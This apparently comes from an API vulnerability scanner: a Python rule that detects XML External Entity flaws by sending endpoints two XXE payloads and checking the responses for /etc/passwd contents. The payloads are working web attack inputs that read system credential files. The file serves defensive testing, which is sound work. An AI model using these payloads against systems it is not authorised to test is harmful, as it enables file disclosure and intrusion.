from typing import List
import re
from apscan.core.context import APIEndpoint, Vulnerability, Severity, ScanContext, HttpMethod, ScanRequest
from apscan.core.rule import ScannerRule

class XXERule(ScannerRule):
    id = "INJ-006"
    name = "XML External Entity (XXE)"
    
    # Basic XXE
    PAYLOAD_BASIC = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>"""

    # Parameter Entity XXE (OOB often required, but this checks basic support)
    PAYLOAD_PARAM = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]><foo>test</foo>"""

    async def run(self, endpoint: APIEndpoint, context: ScanContext) -> List[Vulnerability]:
        findings = []
        # Target endpoints that might accept XML
        # Or blindly try converting JSON to XML?
        # For now, let's target endpoints that explicitely mention XML or just POSTs where we force Content-Type.
        
        if endpoint.method in ["POST", "PUT"]:
             findings.extend(await self._test_endpoint(endpoint, context))
        return findings

    async def _test_endpoint(self, endpoint, context):
        findings = []
        base_url = context.target_url.rstrip('/') + endpoint.path
        
        headers = {}
        headers.update(context.auth_headers)
        headers['Content-Type'] = 'application/xml'
        
        payloads = [self.PAYLOAD_BASIC, self.PAYLOAD_PARAM]
        
        for payload in payloads:
            req = ScanRequest(
                method=endpoint.method,
                url=base_url,
                data=payload,
                headers=headers
            )
            
            resp = await context.http_client.send(req)
            
            if "root:x:0:0" in resp.body:
                findings.append(Vulnerability(
                    rule_id=self.id,
                    name=self.name,
                    severity=Severity.CRITICAL,
                    description="XML External Entity (XXE) vulnerability detected. Server parsed external entity.",
                    impact="File Disclosure (LFI), SSRF, DoS.",
                    endpoint=endpoint.path,
                    recommendation="Disable DTD processing and external entities in your XML parser config.",
                    method=endpoint.method,
                    evidence=f"Payload: {payload}\nMatched: root:x:0:0\nResponse Snippet: {resp.body[:200]}"
                ))
                return findings
            
        return findings
